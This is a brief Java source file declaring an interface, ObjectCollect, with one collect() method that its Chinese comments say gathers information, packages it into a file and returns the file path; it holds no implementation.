/**
 * @(#) ObjectCollect.java Created on 2013-1-19
 *
 * Copyright (c) 2013 com.braver. All Rights Reserved
 */
package com.google.android.daemon.collect;

/**
 * The class <code>ObjectCollect</code>
 * <p>
 * 信息收集器
 * 
 * @author ouyangfeng
 * @version 1.0
 */
public interface ObjectCollect {

    /**
     * 收集器,收集信息好了,打包成文件,返回文件路径
     * 
     * @return
     */
    public String collect();

}
